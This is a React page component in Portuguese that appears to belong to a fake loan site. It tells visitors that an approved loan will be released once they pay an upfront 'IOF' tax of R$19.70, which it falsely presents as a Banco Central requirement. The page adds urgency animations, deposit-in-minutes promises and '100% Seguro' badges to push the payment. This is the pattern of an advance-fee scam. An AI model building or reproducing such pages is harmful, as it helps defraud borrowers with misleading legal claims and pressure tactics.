
import { useState } from 'react';
import { useLocation } from 'react-router-dom';
import { Unlock, AlertTriangle, Zap, Shield, Clock } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { formatCurrency } from '@/utils/formatters';

const IOFPayment = () => {
  const location = useLocation();
  const { loanValue, personalData, bankData } = location.state || {};
  
  const iofValue = 19.70;
  const [isProcessing, setIsProcessing] = useState(false);

  const handlePayment = () => {
    setIsProcessing(true);
    // Simular processamento
    setTimeout(() => {
      setIsProcessing(false);
    }, 3000);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-yellow-50 via-white to-green-50">
      <div className="container mx-auto px-4 py-16">
        <div className="max-w-2xl mx-auto">
          <div className="bg-white rounded-2xl shadow-2xl p-8 border border-yellow-100">
            {/* Animated Header */}
            <div className="text-center space-y-6 mb-8">
              <div className="relative">
                <div className="w-20 h-20 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-full mx-auto flex items-center justify-center animate-pulse shadow-lg">
                  <AlertTriangle className="w-10 h-10 text-white animate-bounce" />
                </div>
                <div className="absolute -top-2 -right-2 w-6 h-6 bg-red-500 rounded-full animate-ping"></div>
              </div>
              
              <div className="space-y-3">
                <h1 className="text-3xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-orange-600 to-red-600 animate-fade-in">
                  ⚠️ Última etapa para liberação!
                </h1>
                <div className="flex items-center justify-center space-x-2 animate-slide-in-right">
                  <Clock className="w-5 h-5 text-yellow-600 animate-spin" />
                  <span className="text-lg text-yellow-700 font-medium">Finalize agora e receba em minutos!</span>
                </div>
              </div>
            </div>

            {/* Enhanced IOF Explanation */}
            <div className="bg-gradient-to-r from-blue-50 to-indigo-50 rounded-2xl p-6 mb-8 space-y-4 border border-blue-100 animate-scale-in">
              <div className="flex items-center space-x-3">
                <Shield className="w-6 h-6 text-blue-600 animate-pulse" />
                <h3 className="text-lg font-bold text-blue-800">Imposto Obrigatório (IOF)</h3>
              </div>
              
              <p className="text-gray-700 leading-relaxed">
                Para liberar o valor em sua conta, é necessário o pagamento do IOF (Imposto sobre Operações Financeiras), 
                conforme exigência do Banco Central do Brasil.
              </p>
              
              <div className="bg-white p-4 rounded-lg space-y-3 animate-fade-in">
                <div className="flex items-center justify-between">
                  <span className="text-gray-600">Valor do IOF:</span>
                  <span className="text-2xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-green-600 to-blue-600 animate-pulse">
                    {formatCurrency(iofValue)}
                  </span>
                </div>
                <p className="text-sm text-gray-500 flex items-center space-x-2">
                  <Zap className="w-4 h-4 text-yellow-500" />
                  <span>Pagamento único e obrigatório por lei</span>
                </p>
              </div>
            </div>

            {/* Enhanced Loan Summary */}
            <div className="bg-gradient-to-r from-green-50 to-emerald-50 rounded-2xl p-6 mb-8 border border-green-100 animate-slide-in-right">
              <h3 className="font-bold text-green-800 mb-4 flex items-center space-x-2">
                <Unlock className="w-5 h-5 animate-bounce" />
                <span>Seu empréstimo aprovado:</span>
              </h3>
              
              <div className="space-y-3">
                <div className="flex items-center justify-between">
                  <span className="text-green-700">Valor liberado:</span>
                  <span className="text-3xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-green-600 to-emerald-600 animate-pulse">
                    {formatCurrency(loanValue || 0)}
                  </span>
                </div>
                
                <div className="bg-white p-3 rounded-lg animate-fade-in">
                  <p className="text-sm text-green-600 font-medium flex items-center space-x-2">
                    <Zap className="w-4 h-4 animate-pulse" />
                    <span>Será depositado em até 5 minutos após o pagamento</span>
                  </p>
                </div>
              </div>
            </div>

            {/* Enhanced Payment Button */}
            <div className="text-center space-y-6">
              {!isProcessing ? (
                <Button 
                  onClick={handlePayment}
                  className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white px-8 py-6 text-xl font-bold rounded-2xl shadow-2xl transition-all duration-300 transform hover:scale-105 animate-pulse border-2 border-green-400"
                  size="lg"
                >
                  <Unlock className="w-6 h-6 mr-3 animate-bounce" />
                  Pagar IOF {formatCurrency(iofValue)} e liberar {formatCurrency(loanValue || 0)}
                </Button>
              ) : (
                <div className="space-y-4">
                  <div className="flex justify-center">
                    <div className="relative">
                      <div className="animate-spin rounded-full h-16 w-16 border-4 border-green-200 border-t-green-600"></div>
                      <div className="absolute inset-0 rounded-full animate-ping border-2 border-green-300 opacity-20"></div>
                    </div>
                  </div>
                  <p className="text-xl font-semibold text-green-600 animate-pulse">
                    Processando pagamento...
                  </p>
                </div>
              )}

              {/* Security badges */}
              <div className="flex justify-center space-x-6 text-sm text-gray-500">
                <div className="flex items-center space-x-2 animate-fade-in">
                  <Shield className="w-4 h-4 text-green-500" />
                  <span>100% Seguro</span>
                </div>
                <div className="flex items-center space-x-2 animate-fade-in delay-100">
                  <Zap className="w-4 h-4 text-blue-500" />
                  <span>Instantâneo</span>
                </div>
                <div className="flex items-center space-x-2 animate-fade-in delay-200">
                  <Unlock className="w-4 h-4 text-purple-500" />
                  <span>Protegido</span>
                </div>
              </div>
            </div>

            {/* Floating animated elements */}
            <div className="absolute inset-0 overflow-hidden pointer-events-none">
              <div className="absolute top-12 left-12 w-3 h-3 bg-yellow-400 rounded-full animate-bounce delay-100"></div>
              <div className="absolute top-24 right-16 w-2 h-2 bg-green-400 rounded-full animate-bounce delay-300"></div>
              <div className="absolute bottom-16 left-20 w-2 h-2 bg-blue-400 rounded-full animate-bounce delay-500"></div>
              <div className="absolute bottom-12 right-12 w-3 h-3 bg-purple-400 rounded-full animate-bounce delay-700"></div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default IOFPayment;
